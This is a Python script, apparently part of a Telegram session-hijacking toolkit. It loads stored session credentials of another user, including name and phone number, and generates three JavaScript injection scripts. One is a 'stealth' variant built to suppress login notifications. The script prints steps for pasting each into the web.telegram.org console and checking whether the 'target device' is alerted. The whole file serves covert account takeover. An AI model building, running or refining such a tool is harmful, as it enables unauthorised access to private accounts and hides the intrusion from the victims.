#!/usr/bin/env python3
"""
Test Script Comparison

This script generates three different script formats for comparison:
1. Original Format (Friend's Style)
2. Stealth Format (Notification Blocking)
3. Complete Session Format (Full Telegram Web Context)
"""

import os
import json
from datetime import datetime
from utils.credentials_manager import credentials_manager

def compare_script_formats():
    """Generate all three script formats for comparison"""
    
    # Get the most recent JSON credentials file
    all_files = credentials_manager.list_credentials_files()
    json_files = [f for f in all_files if f['filename'].endswith('.json')]
    
    if not json_files:
        print("❌ No JSON credential files found")
        return
    
    latest_file = json_files[0]
    print(f"📁 Using latest credential file: {latest_file['filename']}")
    
    # Load the credentials
    credentials = credentials_manager.load_credentials(latest_file['filename'])
    if not credentials or 'session_data' not in credentials:
        print("❌ No valid session data found in credentials")
        return
    
    session_data = credentials['session_data']
    user_info = credentials.get('user_info', {})
    
    print(f"✅ Valid credential data found")
    print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
    print(f"📦 Session Data Keys: {list(session_data.keys())}")
    
    # Generate all three script formats
    original_script = credentials_manager.generate_working_format_script(session_data)
    stealth_script = credentials_manager.generate_stealth_script(session_data)
    complete_session_script = credentials_manager.generate_complete_session_script(session_data)
    
    # Save all scripts
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Save original format
    original_filename = f"original_format_{timestamp}.js"
    original_filepath = os.path.join("credentials", original_filename)
    with open(original_filepath, 'w', encoding='utf-8') as f:
        f.write(original_script)
    
    # Save stealth format
    stealth_filename = f"stealth_format_{timestamp}.js"
    stealth_filepath = os.path.join("credentials", stealth_filename)
    with open(stealth_filepath, 'w', encoding='utf-8') as f:
        f.write(stealth_script)
    
    # Save complete session format
    complete_filename = f"complete_session_{timestamp}.js"
    complete_filepath = os.path.join("credentials", complete_filename)
    with open(complete_filepath, 'w', encoding='utf-8') as f:
        f.write(complete_session_script)
    
    print(f"✅ Original format saved: {original_filename}")
    print(f"✅ Stealth format saved: {stealth_filename}")
    print(f"✅ Complete session format saved: {complete_filename}")
    
    # Display comparison
    print("\n" + "="*80)
    print("🔍 SCRIPT COMPARISON")
    print("="*80)
    
    print("\n📋 ORIGINAL FORMAT (Friend's Style):")
    print("-" * 40)
    print(original_script)
    
    print("\n📋 STEALTH FORMAT (Notification Blocking):")
    print("-" * 40)
    print(stealth_script)
    
    print("\n📋 COMPLETE SESSION FORMAT (Full Context):")
    print("-" * 40)
    print(complete_session_script)
    
    print("\n" + "="*80)
    print("🧪 TESTING INSTRUCTIONS")
    print("="*80)
    
    print("\n1. Test Original Format:")
    print(f"   - Copy content from: {original_filename}")
    print("   - Paste in web.telegram.org/a/ console")
    print("   - Check if notifications are sent")
    
    print("\n2. Test Stealth Format:")
    print(f"   - Copy content from: {stealth_filename}")
    print("   - Paste in web.telegram.org/a/ console")
    print("   - Check if notifications are sent")
    
    print("\n3. Test Complete Session Format:")
    print(f"   - Copy content from: {complete_filename}")
    print("   - Paste in web.telegram.org/a/ console")
    print("   - Check if notifications are sent")
    
    print("\n4. Compare Results:")
    print("   - Which one prevents notifications?")
    print("   - Which one works like your friend's script?")
    print("   - Which one has the most complete session structure?")
    
    print("\n💡 Tips:")
    print("   - Use incognito mode for clean testing")
    print("   - Try different browsers")
    print("   - Check notification settings on target device")
    print("   - Monitor network requests in Developer Tools")
    print("   - The complete session format should be most effective")

if __name__ == "__main__":
    print("🔍 Script Format Comparison Tool (3 Formats)")
    print("=" * 60)
    compare_script_formats() 